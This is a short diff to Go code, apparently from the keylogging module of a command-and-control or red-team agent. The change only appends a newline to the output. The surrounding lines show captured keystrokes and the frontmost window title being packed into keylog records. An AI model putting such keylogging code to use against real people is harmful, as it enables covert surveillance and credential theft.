@@ -39,7 +39,7 @@ func Run(task structs.Task) {
 			return
 		}
 		if output != "" {
-			msg.UserOutput = output
+			msg.UserOutput = output + "\n"
 			keylogData := make([]structs.Keylog, 1)
 			keylogData[0].Keystrokes = output
 			keylogData[0].WindowTitle, _ = GetFrontmostApp()
